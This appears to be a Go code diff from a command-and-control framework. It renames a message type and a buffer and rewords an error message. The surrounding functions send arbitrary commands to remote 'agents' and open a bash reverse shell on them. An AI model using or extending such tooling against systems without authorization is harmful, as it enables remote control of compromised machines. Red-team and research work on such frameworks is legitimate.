@@ -114,7 +114,7 @@ func ModuleRun() {
 		return
 	}
 	if Targets[CurrentTarget] == nil {
-		CliPrintError("Target not exist, is it connected?")
+		CliPrintError("Target not exist, type `info` to check")
 		return
 	}
 
@@ -147,7 +147,7 @@ func moduleShell() {
 	}
 
 	// send data
-	var data agent.TunData
+	var data agent.MsgTunData
 	CliPrintWarning("\nEntering shell of agent[%d] ...\n"+
 		"Note: Use `bash` command to start a bash reverse shell, type `help` for more info",
 		tControl.Index)
@@ -204,7 +204,7 @@ shell:
 
 			// launch local terminal to use remote bash shell
 			send := make(chan []byte)
-			reverseBash(agent.H2Stream.Ctx, send, RecvAgent)
+			reverseBash(agent.H2Stream.Ctx, send, ShellRecvBuf)
 			time.Sleep(1 * time.Second)
 			break shell
 
@@ -283,7 +283,7 @@ func moduleCmd() {
 	}
 
 	// send data
-	var data agent.TunData
+	var data agent.MsgTunData
 	data.Payload = "cmd" + agent.OpSep + Options["cmd_to_exec"].Val
 	data.Tag = target.Tag
 	err := Send2Agent(&data, target)
